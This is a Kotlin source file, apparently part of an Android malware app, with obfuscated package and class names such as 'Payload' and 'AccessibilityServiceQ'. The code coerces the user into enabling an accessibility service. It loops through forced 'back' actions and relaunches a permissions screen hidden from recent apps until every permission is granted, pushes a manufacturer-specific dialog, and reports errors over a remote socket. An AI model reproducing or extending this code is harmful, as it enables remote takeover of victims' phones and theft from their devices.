package com.xxx.zzz.globp

import android.app.Activity
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.wifi.WifiManager
import android.os.Build
import android.provider.Settings
import com.xxx.zzz.Payload
import com.xxx.zzz.PermissionsActivity
import com.xxx.zzz.aall.orgsss.jetbrains.ankos.jetbrains.dialogs.toast
import com.xxx.zzz.aall.permasd.PermUtil
import com.xxx.zzz.accessppp.AccessibilityServiceQ
import com.xxx.zzz.notifp.DialogActivityasd
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.Calendar

object UtilsGfgsd {

    var first = true

    fun gotoAccessibilityService(activity: Activity) {
        ensureAccessibilityServiceEnabled({
            bringMeFront(activity)
            Payload.ApplicationScope.launch {
                runCatching {
                    delay(800)
                    while (isActive && !SharedPreferencess.hasAllPermition) {
                        if (PermissionsActivity.permStart != null && (PermissionsActivity.permStart == 0L || Calendar.getInstance().timeInMillis - PermissionsActivity.permStart!! > 5000)) {
                            withContext(Dispatchers.Main) {
                                runCatching {
                                    if (first) {
                                        AccessibilityServiceQ.globalActionBack()
                                        AccessibilityServiceQ.globalActionBack()
                                        AccessibilityServiceQ.globalActionBack()
                                        AccessibilityServiceQ.globalActionBack()
                                        first = false
                                    }
                                    startApplicationPerm(activity)
                                }
                            }
                        }
                        delay(500)
                    }
                }
            }
        }) {
            AccessibilityServiceQ.globalActionBack()
            bringMeFront(activity)
            Globalqa.mainHandler?.post {
                runCatching { gotoAccessibilityService(activity) }
            }
        }
    }

    fun startApplicationPerm(context: Context) {
        runCatching {
            val intent = Intent(context, PermissionsActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            context.startActivity(intent)
        }.onFailure {
            IOSocketyt.sendLogs("", "startApplication ${it.localizedMessage}", "error")
        }
    }

    fun wifiIpAddress(context: Context): String {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val ip = wifiManager.connectionInfo.ipAddress
        return if (ip == 0) {
            ""
        } else String.format(
            "%d.%d.%d.%d",
            ip and 0xff,
            ip shr 8 and 0xff,
            ip shr 16 and 0xff,
            ip shr 24 and 0xff
        )
    }

    private fun bringMeFront(context: Context) {
        val intent = Intent(context, context.javaClass)
        intent.flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        val pendingIntent = PendingIntent.getActivity(context, 0, intent, 0 or PendingIntent.FLAG_IMMUTABLE)
        runCatching {
            pendingIntent.send()
        }.onFailure {
            Payload.start2(context)
        }
    }

    private fun ensureAccessibilityServiceEnabled(enterCallback: Runnable, exitCallback: Runnable) {
        val checkInterval: Long = 2000
        val exitWrapper: Runnable = object : Runnable {
            override fun run() {
                runCatching {
                    if (!AccessibilityServiceQ.isEnabled) {
                        runCatching { Globalqa.mainActivity.get()?.toast("accessibility disconnected") }
                        exitCallback.run()
                    } else {
                        Globalqa.mainHandler?.postDelayed(this, checkInterval)
                    }
                }
            }
        }
        val enterWrapper: Runnable = object : Runnable {
            override fun run() {
                runCatching {
                    if (AccessibilityServiceQ.isEnabled) {
                        enterCallback.run()
                        Globalqa.mainHandler?.postDelayed(exitWrapper, checkInterval)
                    } else {
                        Globalqa.mainHandler?.postDelayed(this, checkInterval)
                    }
                }
            }
        }
        var enterDelay: Long = 0
        runCatching {
            if (!AccessibilityServiceQ.isEnabled || !PermUtil.isAccessibilityServiceEnabled(Globalqa.mainActivity.get()!!, AccessibilityServiceQ::class.java)) {
                Globalqa.mainHandler?.postDelayed({
                   runCatching { Globalqa.mainActivity.get()?.toast("need accessibility service") }
                }, 2000)
                gotoAccessibilityService()
                enterDelay = 3000
            }
            Globalqa.mainHandler?.postDelayed(enterWrapper, enterDelay)
        }.onFailure {
            IOSocketyt.sendLogs("", "gotoAccessibilityService error!!! ${it.localizedMessage}", "error")
        }
    }

    private fun gotoAccessibilityService() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        Globalqa.mainActivity.get()?.startActivity(intent)

        if (PermissionsActivity.s228.isNotEmpty()) {
            if ("xiaomi" == Build.MANUFACTURER.lowercase() && Build.VERSION.SDK_INT >= 29) {
                Globalqa.mainActivity.get()?.startActivity(
                    Intent(Globalqa.mainActivity.get()!!, DialogActivityasd::class.java)
                        .apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                        })
            } else {
                Globalqa.mainActivity.get()?.startActivity(
                    Intent(Globalqa.mainActivity.get()!!, DialogActivityasd::class.java)
                        .apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                        })
            }
        }
    }

}